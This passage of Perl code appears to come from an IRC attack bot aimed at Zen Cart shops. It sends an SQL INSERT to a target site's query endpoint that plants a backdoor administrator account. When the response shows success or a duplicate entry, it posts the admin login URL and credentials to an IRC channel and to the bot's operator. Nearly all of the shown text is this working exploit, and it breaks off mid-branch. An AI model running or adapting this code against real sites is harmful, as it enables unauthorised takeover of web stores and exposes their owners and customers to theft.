sub zen_query() {
	my $chan = $_[0];
	my $url = $_[1];
	my $test = $_[2];
	my $engine = $_[3];
	my $simpan = $_[4];
	my $code  = "INSERT INTO admin (admin_id, admin_name, admin_email, admin_pass) VALUES (2283,'abc','localhost','617ec22fbb8f201c366e9848c0eb6925:87');";
	my $req = HTTP::Request->new(POST => $test);
	my $nama = $simpan;
	
	$req->content_type("application/x-www-form-urlencoded");
	$req->content("query_string=".$code);
	my $ua = LWP::UserAgent->new(agent => $uagent);
	$ua->timeout(3);
	my $res = $ua->request($req);
	my $data = $res->as_string;
	if ( $data =~ /1 statements processed/i ) {
	my $vuln = "http://".$url."admin/login.php";
	my $user = "abc";
	my $pass = "wew";
		&msg("$chan","$zenlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (USER=$user) (PASS=$pass) ");
		&msg("$nama","$zenlogo15$engine 4<9=4>9 Admin login 4<9=4>9 $vuln15 (USER=$user) (PASS=$pass) ");
		&msg("$admin","$zenlogo15$engine 4<9=4>9 Admin login 4<9=4>9 $vuln15 (USER=$user) (PASS=$pass) ");

	}
	elsif ( $data =~ /Duplicate entry/i ) {
	my $vuln = "http://".$url."admin/login.php";
	my $user = "abc";
	my $pass = "wew";	
	    &msg("$chan","$zenlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (USER=$user) (PASS=$pass) ");
